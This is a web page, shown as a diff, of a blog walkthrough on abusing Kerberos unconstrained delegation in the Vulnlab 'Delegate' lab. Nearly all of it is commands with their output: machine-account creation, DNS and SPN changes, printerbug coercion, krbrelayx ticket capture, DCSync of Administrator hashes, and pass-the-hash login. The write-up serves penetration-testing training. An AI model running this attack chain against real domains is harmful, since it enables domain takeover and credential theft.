@@ -1,0 +1,209 @@
+<!doctype html>
+<html lang="en">
+<head>
+
+
+<meta charset="utf-8"><script>(function(){try{var T={"butterfly":"/","claude":"/claude/","loaf":"/loaf/"},here="claude",root=T[here],L=location,p=L.pathname;var q=new URLSearchParams(L.search),want=q.get("theme"),picked=want&&T[want]!==undefined;if(picked){localStorage.setItem("blog-theme",want);q.delete("theme")}else{want=localStorage.getItem("blog-theme")}var s=q.toString();s=s?"?"+s:"";var lost=p.indexOf(root)!==0;for(var k in T){if(k!==here&&T[k].length>root.length&&p.indexOf(T[k])===0)lost=true}if(want&&want!==here&&T[want]!==undefined&&!lost){L.replace(T[want]+p.slice(root.length)+s+L.hash);return}if(picked){history.replaceState(null,"",p+s+L.hash);var st=document.createElement("style");st.textContent="@view-transition{navigation:auto}";document.head.appendChild(st)}}catch(e){}})()</script><style>.tsw{position:relative}.tsw summary{list-style:none;cursor:pointer;user-select:none}.tsw summary::-webkit-details-marker{display:none}.tsw-menu{position:absolute;right:0;top:calc(100% + .4rem);z-index:50;display:grid;min-width:9.5rem;padding:.3rem;border:1px solid var(--line);border-radius:8px;background:var(--bg);box-shadow:0 6px 24px rgba(0,0,0,.18)}.tsw-menu a{display:block;padding:.35rem .6rem;border-radius:5px;color:var(--fg);text-decoration:none;white-space:nowrap;box-shadow:none}.tsw-menu a:hover{background:var(--surface)}.tsw-menu a[aria-current]{color:var(--accent)}.tsw-menu a[aria-current]::after{content:" ✓"}@media print{.tsw{display:none}}.nav .tsw summary{color:var(--muted)}.nav .tsw summary:hover,.nav .tsw[open] summary{color:var(--accent)}.nav .tsw-menu a{color:var(--fg)}@media (max-width:40rem){.site-header{position:relative}.nav .tsw{position:static}.nav .tsw-menu{top:100%}}</style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Abusing Unconstrained Delegation · serioton</title>
+
+<meta name="description" content="Abusing Unconstrained Delegation from linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Abusing Unconstrained Delegation">
+<meta property="og:url" content="https://seriotonctf.github.io/claude/Abusing-Unconstrained-Delegation/index.html">
+<meta property="og:site_name" content="serioton">
+<meta property="og:description" content="Abusing Unconstrained Delegation from linux">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://seriotonctf.github.io/img/thumbnails/abusing-unconstrained-delegation.png">
+<meta property="article:published_time" content="2025-01-31T17:58:46.000Z">
+<meta property="article:modified_time" content="2025-06-13T14:19:55.000Z">
+<meta property="article:author" content="serioton">
+<meta property="article:tag" content="active directory">
+<meta property="article:tag" content="dcsync">
+<meta property="article:tag" content="delegation">
+<meta property="article:tag" content="unconstrained delegation">
+<meta property="article:tag" content="krbrelayx">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://seriotonctf.github.io/img/thumbnails/abusing-unconstrained-delegation.png">
+<link rel="canonical" href="https://seriotonctf.github.io/Abusing-Unconstrained-Delegation/">
+<meta name="theme-color" content="#faf9f5" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#1f1e1d" media="(prefers-color-scheme: dark)">
+
+<link rel="icon" href="/claude/img/iconcat.png">
+
+
+<link rel="alternate" type="application/atom+xml" title="serioton" href="/claude/atom.xml">
+
+<link rel="preload" as="font" type="font/woff2" href="/claude/fonts/iosevka-latin-400-normal.woff2" crossorigin>
+<link rel="stylesheet" href="/claude/css/claude.css">
+<script>try{var t=localStorage.getItem('theme');if(t==='dark'||t==='light')document.documentElement.dataset.theme=t}catch(e){}</script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<header class="site-header wrap">
+  <a class="brand" href="/claude/"><span class="spark" aria-hidden="true">✻</span> serioton</a>
+  <nav class="nav" aria-label="main">
+    
+    <a href="/claude/archives/">/archives</a>
+    
+    <a href="/claude/categories/">/categories</a>
+    
+    <a href="/claude/tags/">/tags</a>
+    
+    <a href="/claude/about/">/about</a>
+    
+    <details class="tsw"><summary title="switch the blog theme">/skin</summary><div class="tsw-menu"><a data-switch="butterfly" href="/?theme=butterfly">Butterfly</a><a data-switch="claude" href="/claude/?theme=claude" aria-current="true">Claude Code</a><a data-switch="loaf" href="/loaf/?theme=loaf">Loaf</a></div></details>
+    <button type="button" data-theme-toggle title="switch between light and dark">/theme</button>
+  </nav>
+</header>
+
+<main id="main" class="wrap">
+
+
+
+
+<article class="post" data-post="Abusing Unconstrained Delegation">
+  <p class="you"><span aria-hidden="true">&gt;</span> cat posts/Abusing-Unconstrained-Delegation.md</p>
+
+  <header class="tool post-head">
+    <p class="call"><b>Read</b>(posts/Abusing-Unconstrained-Delegation.md)</p>
+    <p class="result">Read 227 lines</p>
+  </header>
+
+  <div class="say">
+    <h1>Abusing Unconstrained Delegation</h1>
+    <p class="lede">Abusing Unconstrained Delegation from linux</p>
+    <div class="meta">
+      <time datetime="2025-01-31T17:58:46.000Z">2025-01-31</time>
+      <a href="/claude/categories/notes/">notes</a>
+      
+      <a href="/claude/tags/active-directory/" rel="tag">#active directory</a><a href="/claude/tags/dcsync/" rel="tag">#dcsync</a><a href="/claude/tags/delegation/" rel="tag">#delegation</a><a href="/claude/tags/unconstrained-delegation/" rel="tag">#unconstrained delegation</a><a href="/claude/tags/krbrelayx/" rel="tag">#krbrelayx</a>
+    </div>
+  </div>
+
+  
+
+  <div class="post-body">
+    
+    <nav class="todos" aria-label="table of contents">
+      <details>
+        <summary><b>Update Todos</b></summary>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Method1"><span class="toc-text">Method1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method2"><span class="toc-text">Method2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack"><span class="toc-text">Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Verify-That-MachineAccountQuota-Is-Not-Set-to-Zero"><span class="toc-text">Verify That MachineAccountQuota Is Not Set to Zero</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-computer-account"><span class="toc-text">Create a new computer account</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Add-a-new-DNS-record"><span class="toc-text">Add a new DNS record</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Add-the-TRUSTED-FOR-DELEGATION-flag-to-the-machine-account-we-created"><span class="toc-text">Add the TRUSTED_FOR_DELEGATION flag to the machine account we created</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Verify-that-the-attribute-was-successfully-written"><span class="toc-text">Verify that the attribute was successfully written</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Add-SPN"><span class="toc-text">Add SPN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Start-krbrelayx"><span class="toc-text">Start krbrelayx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trigger-the-exploit"><span class="toc-text">Trigger the exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#krbrelayx-output"><span class="toc-text">krbrelayx output</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DCSync"><span class="toc-text">DCSync</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a></li></ol>
+      </details>
+    </nav>
+    
+    
+    <label class="section-filter" hidden>
+      <span aria-hidden="true">grep</span>
+      <input type="search" placeholder="filter sections…" autocomplete="off" spellcheck="false" aria-label="filter sections">
+      <em aria-live="polite"></em>
+    </label>
+    
+    <div class="prose">
+      <blockquote>
+<p>Reference: Delegate machine from Vulnlab</p>
+</blockquote>
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Method1"><a href="#Method1" class="headerlink" title="Method1"></a>Method1</h3><figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">*Evil-WinRM* PS C:\&gt; </span>whoami /priv</span><br><span class="line out"></span><br><span class="line out">PRIVILEGES INFORMATION</span><br><span class="line out">----------------------</span><br><span class="line out"></span><br><span class="line out">Privilege Name                Description                                                    State</span><br><span class="line out">============================= ============================================================== =======</span><br><span class="line out">...</span><br><span class="line out">SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled</span><br><span class="line out">...</span><br></pre></td></tr></table></figure>
+<h3 id="Method2"><a href="#Method2" class="headerlink" title="Method2"></a>Method2</h3><figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>nxc smb 10.10.68.115 -u &#x27;a&#x27; -p &#x27;&#x27; --share SYSVOL --get-file &quot;delegate.vl/Policies/&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&quot; GptTmpl.inf</span><br><span class="line out">SMB         10.10.68.115    445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)</span><br><span class="line out">SMB         10.10.68.115    445    DC1              [+] delegate.vl\a: (Guest)</span><br><span class="line out">SMB         10.10.68.115    445    DC1              [*] Copying &quot;delegate.vl/Policies/&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&quot; to &quot;GptTmpl.inf&quot;</span><br><span class="line out">SMB         10.10.68.115    445    DC1              [+] File &quot;delegate.vl/Policies/&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&quot; was downloaded to &quot;GptTmpl.inf&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>cat GptTmpl.inf</span><br><span class="line out">...</span><br><span class="line out">SeEnableDelegationPrivilege = *S-1-5-21-1484473093-3449528695-2030935120-1108,*S-1-5-32-544</span><br></pre></td></tr></table></figure>
+
+<p><code>S-1-5-21-1484473093-3449528695-2030935120-1108</code> is the SID of the user <code>N.Thompson</code></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>nxc smb delegate.vl -u &#x27;a&#x27; -p &#x27;&#x27; --rid-brute</span><br><span class="line out">SMB         10.10.83.107    445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)</span><br><span class="line out">SMB         10.10.83.107    445    DC1              [+] delegate.vl\a: (Guest)</span><br><span class="line out">...</span><br><span class="line out">SMB         10.10.83.107    445    DC1              1108: DELEGATE\N.Thompson (SidTypeUser)</span><br><span class="line out">...</span><br></pre></td></tr></table></figure>
+<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><h3 id="Verify-That-MachineAccountQuota-Is-Not-Set-to-Zero"><a href="#Verify-That-MachineAccountQuota-Is-Not-Set-to-Zero" class="headerlink" title="Verify That MachineAccountQuota Is Not Set to Zero"></a>Verify That MachineAccountQuota Is Not Set to Zero</h3><figure class="highlight terminal bash"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>nxc ldap dc1 -u n.thompson -p KALEB_2341 -M maq</span><br><span class="line out">LDAP        10.10.68.115    389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)</span><br><span class="line out">LDAP        10.10.68.115    389    DC1              [+] delegate.vl\n.thompson:KALEB_2341</span><br><span class="line out">MAQ         10.10.68.115    389    DC1              [*] Getting the MachineAccountQuota</span><br><span class="line out">MAQ         10.10.68.115    389    DC1              MachineAccountQuota: 10</span><br></pre></td></tr></table></figure>
+<h3 id="Create-a-new-computer-account"><a href="#Create-a-new-computer-account" class="headerlink" title="Create a new computer account"></a>Create a new computer account</h3><figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">(venv) $ </span>addcomputer.py delegate.vl/n.thompson:KALEB_2341 -computer-name serio -computer-pass Password123</span><br><span class="line out">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line out"></span><br><span class="line out">[*] Successfully added machine account serio$ with password Password123.</span><br></pre></td></tr></table></figure>
+<h3 id="Add-a-new-DNS-record"><a href="#Add-a-new-DNS-record" class="headerlink" title="Add a new DNS record"></a>Add a new DNS record</h3><figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">(venv) $ </span>dnstool.py -u &#x27;delegate.vl\serio$&#x27; -p Password123 -r serio.delegate.vl -d 10.8.0.210 --action add DC1.delegate.vl -dns-ip 10.10.83.107</span><br><span class="line out">[-] Connecting to host...</span><br><span class="line out">[-] Binding to host</span><br><span class="line out">[+] Bind OK</span><br><span class="line out">[-] Adding new record</span><br><span class="line out">[+] LDAP operation completed successfully</span><br></pre></td></tr></table></figure>
+<p>verify it’s there</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">(venv) $ </span>dnstool.py -u &#x27;delegate\serio$&#x27; -p Password123 -r serio.delegate.vl -d 10.8.0.210 --action query DC1.delegate.vl -dns-ip 10.10.83.107</span><br><span class="line out">[-] Connecting to host...</span><br><span class="line out">[-] Binding to host</span><br><span class="line out">[+] Bind OK</span><br><span class="line out">[+] Found record serio</span><br><span class="line out">DC=serio,DC=Delegate.vl,CN=MicrosoftDNS,DC=DomainDnsZones,DC=delegate,DC=vl</span><br><span class="line out">[+] Record entry:</span><br><span class="line out"> - Type: 1 (A) (Serial: 235)</span><br><span class="line out"> - Address: 10.8.0.210</span><br></pre></td></tr></table></figure>
+<h3 id="Add-the-TRUSTED-FOR-DELEGATION-flag-to-the-machine-account-we-created"><a href="#Add-the-TRUSTED-FOR-DELEGATION-flag-to-the-machine-account-we-created" class="headerlink" title="Add the TRUSTED_FOR_DELEGATION flag to the machine account we created"></a>Add the TRUSTED_FOR_DELEGATION flag to the machine account we created</h3><figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">(venv) $ </span>bloodyAD -u n.thompson -p KALEB_2341 --host DC1.delegate.vl add uac &#x27;serio$&#x27; -f TRUSTED_FOR_DELEGATION</span><br><span class="line out">[-] [&#x27;TRUSTED_FOR_DELEGATION&#x27;] property flags added to serio$&#x27;s userAccountControl</span><br></pre></td></tr></table></figure>
+<h3 id="Verify-that-the-attribute-was-successfully-written"><a href="#Verify-that-the-attribute-was-successfully-written" class="headerlink" title="Verify that the attribute was successfully written"></a>Verify that the attribute was successfully written</h3><figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">(venv) $ </span>ldapdomaindump -u &#x27;delegate.vl\n.thompson&#x27; -p KALEB_2341 delegate.vl</span><br><span class="line out">[*] Connecting to host...</span><br><span class="line out">[*] Binding to host</span><br><span class="line out">[+] Bind OK</span><br><span class="line out">[*] Starting domain dump</span><br><span class="line out">[+] Domain dump finished</span><br><span class="line cmd"><span class="prompt">(venv) $ </span>grep TRUSTED_FOR_DELEGATION domain_computers.grep</span><br><span class="line out">serio   serio$                                  01/01/01 00:00:00       WORKSTATION_ACCOUNT, TRUSTED_FOR_DELEGATION     01/31/25 16:03:15       S-1-5-21-1484473093-3449528695-2030935120-3101</span><br><span class="line out">DC1     DC1$    DC1.delegate.vl Windows Server 2022 Standard            10.0 (20348)    01/31/25 16:03:32       SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION    08/26/23 09:40:08       S-1-5-21-1484473093-3449528695-2030935120-1000</span><br></pre></td></tr></table></figure>
+<p>or</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">(venv) $ </span>bloodyAD --host dc1.delegate.vl -d delegate.vl -u n.thompson -p KALEB_2341 get object serio$ | grep userAccountControl</span><br><span class="line out">userAccountControl: WORKSTATION_TRUST_ACCOUNT; TRUSTED_FOR_DELEGATION</span><br></pre></td></tr></table></figure>
+<h3 id="Add-SPN"><a href="#Add-SPN" class="headerlink" title="Add SPN"></a>Add SPN</h3><figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">(venv) $ </span>addspn.py -u delegate.vl\\n.thompson -p KALEB_2341 -s cifs/serio.delegate.vl -t serio$ -dc-ip 10.10.83.107 DC1.delegate.vl --additional</span><br><span class="line out">[-] Connecting to host...</span><br><span class="line out">[-] Binding to host</span><br><span class="line out">[+] Bind OK</span><br><span class="line out">[+] Found modification target</span><br><span class="line out">[+] SPN Modified successfully</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">(venv) $ </span>addspn.py -u delegate.vl\\n.thompson -p KALEB_2341 -s cifs/serio.delegate.vl -t serio$ -dc-ip 10.10.83.107 DC1.delegate.vl</span><br><span class="line out">[-] Connecting to host...</span><br><span class="line out">[-] Binding to host</span><br><span class="line out">[+] Bind OK</span><br><span class="line out">[+] Found modification target</span><br><span class="line out">[+] SPN Modified successfully</span><br></pre></td></tr></table></figure>
+<h3 id="Start-krbrelayx"><a href="#Start-krbrelayx" class="headerlink" title="Start krbrelayx"></a>Start krbrelayx</h3><p>The NT Hash can be generated using online tools like CyberChef or:</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>echo -n &#x27;Password123&#x27; | iconv -t utf-16le | openssl md4 -provider legacy | cut -d&#x27; &#x27; -f2</span><br><span class="line out">58a478135a93ac3bf058a5ea0e8fdb71</span><br></pre></td></tr></table></figure>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">(venv) $ </span>krbrelayx.py -hashes :58A478135A93AC3BF058A5EA0E8FDB71 --interface-ip 10.8.0.210</span><br><span class="line out">[*] Protocol Client HTTPS loaded..</span><br><span class="line out">[*] Protocol Client HTTP loaded..</span><br><span class="line out">[*] Protocol Client LDAPS loaded..</span><br><span class="line out">[*] Protocol Client LDAP loaded..</span><br><span class="line out">[*] Protocol Client SMB loaded..</span><br><span class="line out">[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.</span><br><span class="line out">[*] Running in unconstrained delegation abuse mode using the specified credentials.</span><br><span class="line out">[*] Setting up SMB Server</span><br><span class="line out">[*] Setting up HTTP Server on port 80</span><br><span class="line out">[*] Setting up DNS Server</span><br><span class="line out"></span><br><span class="line out">[*] Servers started, waiting for connections</span><br></pre></td></tr></table></figure>
+<h3 id="Trigger-the-exploit"><a href="#Trigger-the-exploit" class="headerlink" title="Trigger the exploit"></a>Trigger the exploit</h3><figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">(venv) $ </span>printerbug.py &#x27;serio$:Password123&#x27;@10.10.83.107 serio.delegate.vl</span><br><span class="line out">[*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line out"></span><br><span class="line out">[*] Attempting to trigger authentication via rprn RPC at 10.10.83.107</span><br><span class="line out">[*] Bind OK</span><br><span class="line out">[*] Got handle</span><br><span class="line out">DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied</span><br><span class="line out">[*] Triggered RPC backconnect, this may or may not have worked</span><br></pre></td></tr></table></figure>
+<h3 id="krbrelayx-output"><a href="#krbrelayx-output" class="headerlink" title="krbrelayx output"></a>krbrelayx output</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] SMBD: Received connection from 10.10.83.107</span><br><span class="line">[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]</span><br><span class="line">[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache</span><br><span class="line">[*] SMBD: Received connection from 10.10.83.107</span><br><span class="line">[-] Unsupported MechType &#x27;NTLMSSP - Microsoft NTLM Security Support Provider&#x27;</span><br><span class="line">[*] SMBD: Received connection from 10.10.83.107</span><br><span class="line">[-] Unsupported MechType &#x27;NTLMSSP - Microsoft NTLM Security Support Provider&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">(venv) $ </span>export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">(venv) $ </span>klist</span><br><span class="line out">Ticket cache: FILE:DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache</span><br><span class="line out">Default principal: DC1$@DELEGATE.VL</span><br><span class="line out"></span><br><span class="line out">Valid starting     Expires            Service principal</span><br><span class="line out">31/01/25 17:09:26  01/02/25 03:03:29  krbtgt/DELEGATE.VL@DELEGATE.VL</span><br><span class="line out">        renew until 07/02/25 17:03:29</span><br></pre></td></tr></table></figure>
+<h3 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h3><figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">(venv) $ </span>secretsdump.py -k -no-pass dc1.delegate.vl -just-dc-user administrator</span><br><span class="line out">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line out"></span><br><span class="line out">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line out">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line out">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::</span><br><span class="line out">[*] Kerberos keys grabbed</span><br><span class="line out">Administrator:aes256-cts-hmac-sha1-96:f877adcb278c4e178c430440573528db38631785a0afe9281d0dbdd10774848c</span><br><span class="line out">Administrator:aes128-cts-hmac-sha1-96:3a25aca9a80dfe5f03cd03ea2dcccafe</span><br><span class="line out">Administrator:des-cbc-md5:ce257f16ec25e59e</span><br><span class="line out">[*] Cleaning up...</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>evil-winrm -i dc1.delegate.vl -u administrator -H c32198ceab4cc695e65045562aa3ee93</span><br><span class="line out"></span><br><span class="line out">Evil-WinRM shell v3.7</span><br><span class="line out"></span><br><span class="line out">Info: Establishing connection to remote endpoint</span><br><span class="line cmd"><span class="prompt">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </span></span><br></pre></td></tr></table></figure>
+<h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/">https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained">https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.netwrix.com/2022/12/02/unconstrained-delegation/">https://blog.netwrix.com/2022/12/02/unconstrained-delegation/</a></li>
+<li><a target="_blank" rel="noopener" href="https://exploit.ph/user-constrained-delegation.html">https://exploit.ph/user-constrained-delegation.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.vulnlab.com/machines">https://www.vulnlab.com/machines</a></li>
+</ul>
+
+    </div>
+  </div>
+
+  <footer class="post-foot">
+    
+    <div class="tool">
+      <p class="call"><b>Search</b>(related: "Abusing-Unconstrained-Delegation.md")</p>
+      <p class="result">Found 3 posts</p>
+      <ul class="list">
+        
+        <li><time datetime="2024-11-24T16:47:11.000Z">2024-11-24</time><a href="/claude/Redelegate-Vulnlab/">Redelegate - Vulnlab</a></li>
+        
+        <li><time datetime="2024-07-24T16:33:01.000Z">2024-07-24</time><a href="/claude/RBCD-Notes/">Abusing Resource-Based Constrained Delegation</a></li>
+        
+        <li><time datetime="2024-11-19T18:47:00.000Z">2024-11-19</time><a href="/claude/AD-ACLs-Cheatsheet/">AD ACLs Cheatsheet</a></li>
+        
+      </ul>
+    </div>
+    
+    
+    <nav class="neighbors" aria-label="more posts">
+      <a class="older" href="/claude/BloodyAD-Cheatsheet/" rel="next"><small>← older</small>BloodyAD Cheatsheet</a>
+      <a class="newer" href="/claude/HTB-Solving-Cicada-Using-Only-NetExec/" rel="prev"><small>newer →</small>HTB: Solving Cicada Using Only NetExec</a>
+    </nav>
+    
+  </footer>
+</article>
+
+</main>
+<footer class="site-footer wrap">
+  
+  <p><span class="spark" aria-hidden="true">✻</span> © 2023–2026 serioton · <a href="/claude/atom.xml">rss</a></p>
+</footer>
+
+
+<div class="bar" data-index="/claude/search.xml">
+  <div class="wrap">
+    <div class="ask">
+      <div class="panel" hidden>
+        <div class="panel-head"></div>
+        <ol class="panel-list" role="listbox" aria-label="results"></ol>
+        <p class="panel-note" aria-live="polite"></p>
+      </div>
+      <label class="input">
+        <span aria-hidden="true">&gt;</span>
+        <input type="text" placeholder='Try "kerberos" or /help' autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="search posts or type a command">
+      </label>
+    </div>
+    <div class="status">
+      <button type="button" class="mode" data-mode-cycle title="shift+tab to cycle modes"><span data-mode-label>? for shortcuts</span></button>
+      <span class="status-right">
+        <button type="button" data-run="model" title="/model"><span data-model>Mythos 5.2</span></button>
+        <button type="button" data-run="effort" title="/effort"><span data-effort>high</span><span class="ctx-word"> effort</span></button>
+        <button type="button" class="ctx" data-run="context" title="/context"><span class="meter" aria-hidden="true"><i></i></span><span data-ctx>0%</span><span class="ctx-word"> context</span></button>
+      </span>
+    </div>
+  </div>
+  <script type="application/json" class="commands">[{"name":"/home","hint":"list all posts","url":"/claude/"},{"name":"/archives","hint":"open archives","url":"/claude/archives/"},{"name":"/categories","hint":"open categories","url":"/claude/categories/"},{"name":"/tags","hint":"open tags","url":"/claude/tags/"},{"name":"/about","hint":"open about","url":"/claude/about/"},{"name":"/rss","hint":"subscribe to the feed","url":"/claude/atom.xml"},{"name":"/resume","hint":"go back to a post you were reading","run":"resume"},{"name":"/random","hint":"read a random post","run":"random"},{"name":"/context","hint":"how much of the context window this page takes","run":"context"},{"name":"/compact","hint":"hide command output in code blocks, or bring it back","run":"compact"},{"name":"/model","hint":"pick the model shown in the status line","run":"model"},{"name":"/effort","hint":"set how hard the model thinks","run":"effort"},{"name":"/permissions","hint":"sites you allowed links to open without asking","run":"permissions"},{"name":"/status","hint":"current model, mode and setup","run":"status"},{"name":"/theme","hint":"switch between light and dark","run":"theme"},{"name":"/butterfly","hint":"switch the blog to the Butterfly theme","url":"/?theme=butterfly"},{"name":"/loaf","hint":"switch the blog to the Loaf theme","url":"/loaf/?theme=loaf"},{"name":"/export","hint":"print this page or save it as a PDF","run":"export"},{"name":"/clear","hint":"reset the mode, filters and prompt","run":"clear"},{"name":"/top","hint":"scroll to the top","run":"top"},{"name":"/help","hint":"list commands and shortcuts","run":"help"}]</script><script>(function(){var s=document.currentScript.previousElementSibling,T={"butterfly":"/","claude":"/claude/","loaf":"/loaf/"},root="/claude/",p=location.pathname,rel=p.indexOf(root)===0?p.slice(root.length):"";try{var c=JSON.parse(s.textContent);c.forEach(function(x){var m=/\?theme=([\w-]+)$/.exec(x.url||"");if(m&&T[m[1]]!==undefined)x.url=T[m[1]]+rel+"?theme="+m[1]});s.textContent=JSON.stringify(c)}catch(e){}})()</script>
+  <script type="application/json" class="session">{"models":[{"name":"Mythos 5.2","id":"claude-mythos-5-2","hint":"most capable"},{"name":"Fable 5.2","id":"claude-fable-5-2","hint":"most capable, with added safeguards"},{"name":"Opus 5.5","id":"claude-opus-5-5","hint":"for complex work"},{"name":"Sonnet 5.5","id":"claude-sonnet-5-5","hint":"best for everyday tasks"},{"name":"Haiku 5.5","id":"claude-haiku-5-5","hint":"fastest"}],"window":200000,"permissions":true,"posts":24}</script>
+</div>
+
+<script src="/claude/js/claude.js" defer></script>
+<script>(function(){var T={"butterfly":"/","claude":"/claude/","loaf":"/loaf/"},here="claude",root=T[here],p=location.pathname;var rel=p.indexOf(root)===0?p.slice(root.length):"";for(var k in T){if(k!==here&&T[k].length>root.length&&p.indexOf(T[k])===0)rel=""}var links=document.querySelectorAll("a[data-switch]");function place(){if(scrollY<200)return"";var h=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id]"),id="";for(var i=0;i<h.length;i++){if(h[i].getBoundingClientRect().top<160)id=h[i].id;else break}return id?"#"+encodeURIComponent(id):""}function url(a){return T[a.dataset.switch]+rel+"?theme="+a.dataset.switch}function warm(a){if(a.dataset.warm)return;a.dataset.warm=1;var l=document.createElement("link");l.rel="prefetch";l.href=url(a);document.head.appendChild(l)}links.forEach(function(a){a.href=url(a);a.addEventListener("pointerenter",function(){warm(a)});a.addEventListener("focus",function(){warm(a)});a.addEventListener("touchstart",function(){warm(a)},{passive:true});a.addEventListener("click",function(){try{localStorage.setItem("blog-theme",a.dataset.switch)}catch(e){}var st=document.createElement("style");st.textContent="@view-transition{navigation:auto}";document.head.appendChild(st);a.href=url(a)+place()})});document.querySelectorAll("details.tsw").forEach(function(d){d.addEventListener("toggle",function(){if(d.open)links.forEach(warm)});document.addEventListener("click",function(e){if(d.open&&!d.contains(e.target))d.open=false});document.addEventListener("keydown",function(e){if(e.key==="Escape")d.open=false})});})()</script></body>
+</html>
